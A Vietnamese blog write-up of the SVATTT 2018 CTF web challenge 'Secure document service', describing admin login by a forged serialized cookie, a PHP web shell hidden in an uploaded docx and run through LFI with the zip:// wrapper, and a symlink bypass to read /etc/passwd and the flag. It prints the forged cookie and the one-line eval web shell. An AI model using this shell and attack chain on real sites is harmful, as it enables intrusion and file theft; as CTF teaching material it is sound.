---
title: "SVATTT 2018 - Secure document service"
date: 2018-11-05T15:37:42+07:00
draft: false
comments: true
author: "Kev"
tags: ["ctf", "svattt 2018"]
---

{{<figure src="/images/uploads/svattt18_01.png">}}


# Mô tả

> 1000 points (1/68 sovles)  
> I made a simple and secure web service for upload and share document. Can you read document to get a gift? :D  
> http://171.244.141.213:8337/

# Gợi ý

> 1.Flag in /tmp/fl4g.php  
> 2.Wrapper  
> 3.https://pastebin.com/g6XSfVfB

# Ý tưởng

> Tìm cách đăng nhập admin bằng... googling {{<emoji lol>}}.  
> Upload file docx chứa mã độc (shell) và gọi ra bằng wrapper zip:// qua LFI.  
> Dùng symlink để bypass filter và đọc flag.

# Chi tiết

## Bước 1: Đăng nhập admin

`<!-- guest:guest account enabled -->` đây là đoạn code comment cũng là hint của tác giả để đăng nhập vào bên trong. Hint này cũng nói lên 1 điều là tôi cần phải đăng nhập được tài khoản admin.
Sau khi đăng nhập tôi nhận được 2 cookie mới:

```
Set-Cookie: auth=Tzo0OiJVc2VyIjoyOntzOjQ6InVzZXIiO3M6NToiZ3Vlc3QiO3M6NDoicGFzcyI7czo1OiJndWVzdCI7fQ%3D%3D; expires=Sat, 03-Nov-2018 06:32:36 GMT; Max-Age=7200; path=/
Set-Cookie: check=MGFkN2ZkNzVjMTE4ZTM4ZGY5ZTc3YzZiMWJmNWI5ZDI%3D; expires=Sat, 03-Nov-2018 06:32:36 GMT; Max-Age=7200; path=/
```
đó cũng chính là đoạn dữ liệu này sau khi decode

```
auth=O:4:"User":2:{s:4:"user";s:5:"guest";s:4:"pass";s:5:"guest";}
check=0ad7fd75c118e38df9e77c6b1bf5b9d2
```

Tôi đã thử đăng nhập với tài khoản admin:admin mà không được, giờ có 2 cách có thể nghĩ ra nhanh là bruteforce mật khẩu dễ của tài khoản admin hoặc fuzz tìm lỗi gì đó như: sqli, ... Mặc dù nghĩ vậy nhưng tôi lại làm cách thứ 3 là search google. {{<emoji lol>}}
Tìm kiếm `0ad7fd75c118e38df9e77c6b1bf5b9d2` trên google mục đích là xem chuỗi plain text là gì nhưng tôi lại tìm ra kết quả khác - writeup của 1 bài tương tự {{<emoji beauty>}} [link](https://www.zybuluo.com/shaobaobaoer/note/1214441)
Thật ra link writeup trên đã nói lên cách làm của challenge này nhưng ... sự thật chớ trêu, tôi lại không chịu đọc hết bài :((  
Cuối cùng, chỉ cần copy cookie y như trong bài blog là vào được admin

```
Cookie: auth=Tzo0OiJVc2VyIjoyOntzOjQ6InVzZXIiO3M6NToiYWRtaW4iO3M6NDoicGFzcyI7YjoxO30%3D; check=Njg5N2YwMDYwYTg0ZWNiMDYwMGU0MTY3ZDJhNzQ4ZTQ%3D
```

## Bước 2: Upload file doc, docx

Bước này khá là tranh cãi, mà vì sao lại cãi thì tôi cũng không rõ. Cơ bản là không hiểu lý do vì sao mà đội này upload được mà đội kia lại không. Sau khi thời gian thi kết thúc, hỏi tác giả cũng không rõ vì sao ?????  
Cùng với LFI ở param `page` + file upload thì đây chính là vector để gọi shell.

{{<figure src="/images/uploads/svattt18_02.png">}}

Nhưng cuộc sống không dễ dàng, tác giả đã add suffix là `.php` nên chỉ gọi được file php cùng với disable các wrapper thông thường thì có thánh mới đọc được source php {{<emoji burn_joss_stick>}}

Từ hint của 1 đồng đội, bản chất của docx, doc, xls, ppt, ... đều là zip. Để shell php nén cùng với docx tôi fuzz thử wrapper zip để gọi lên shell. Ngon ăn luôn.

{{<figure src="/images/uploads/svattt18_03.png">}}

Lên shell trông có vẻ đã đi đến đích rồi, nhưng không, thật sự không. Dưới đây là tất cả function bị disable.

{{<figure src="/images/uploads/svattt18_04.png">}}

Các bạn để ý, `eval` mình bôi đen trên hình là bị chặn nhưng đây là con shell mình up lên server `<?php echo 'Lên shell rồi nhé !!!'; eval($_POST["kv"]);`. {{<emoji lovemachine>}} méo hiểu vì sao, chính vì sự magic đó dẫn đến bước 3.

## Bước 3: Get flag

Mặc dù eval bị disable nhưng vẫn dùng được, không hiểu vì sao, có thể 1 lý do mà mình nghĩ đến là eval không phải function. Thế thì làm sao đọc flag??? Có 2 cách có thể nghĩ đến là suy nghĩ hướng khác, 2 là tìm function bị filter thiếu.  
Kéo lên xem lại hình trên, các function bị disable trong đó có function symlink. Symlink chỉ mới vừa được thêm vào sau khi kết thúc thời gian thi. Thật ra dưới đây mới là các function bị disable.

```
eval, show_source, system, shell_exec, passthru, exec, popen, fopen, proc_open, mail, stream_wrapper_register, include, require, require_once, parse_ini_file, proc_open, curl_exec, set_time_limit, stream_wrapper_restore, file_get_contents, file_put_contents, readfile, copy, file, glob, parse_ini_file
```

Tôi và đồng đội cùng fuzz để tìm được symlink và cũng là cách mà tác giả không mong muốn. (unintend solution !!!). 

Vì không thể dùng symlink để writeup nữa nên mình demo hình ảnh của payload cũ cho các bạn xem

{{<figure src="/images/uploads/svattt18_05.png">}}
{{<figure src="/images/uploads/svattt18_06.png">}}

Lần lượt truy cập vào `http://171.244.141.213:8337/uploads/asdfads.txt` và `http://171.244.141.213:8337/uploads/asdfsssads.txt` sẽ xem được nội dung file `/etc/passwd` và `/tmp/fl4g.php`

> Ghi chú: Cách dùng fsock như ý tác giả các bạn có thể xem trong [link này](https://www.zybuluo.com/shaobaobaoer/note/1214441)  
> Chức năng `Contact` chỉ để cho có thôi, không có tác dụng gì trong đây cả nhưng cũng làm mình mất đến vài tiếng đồng hồ để ghép nối các manh mối lại với nhau cho logic {{<emoji beat_brick>}}  
> Vì sao mà symlink lúc thi không có nhưng khi writeup lại có thì tôi đang liên hệ tác giả để tìm hiểu thêm.  
> Link pastebin ở trên đầu bài từ lúc viết writeup là không truy cập được nữa
